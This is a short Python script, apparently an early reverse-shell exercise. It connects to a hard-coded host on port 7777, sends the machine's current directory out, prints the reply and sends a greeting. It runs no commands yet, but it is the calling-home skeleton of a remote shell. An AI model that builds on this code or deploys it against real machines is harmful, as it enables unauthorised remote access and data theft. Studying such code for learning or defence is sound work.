#!/usr/bin/env python
#_*_codings: utf8_*_

import socket
import os

def shell():
    current_dir = os.getcwd()
    cliente.send(current_dir)
    res = cliente.recv(1024)
    print(res)
    cliente.send('Ola, mundo')

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect(('192.168.18.10', 7777))
shell()
cliente.close()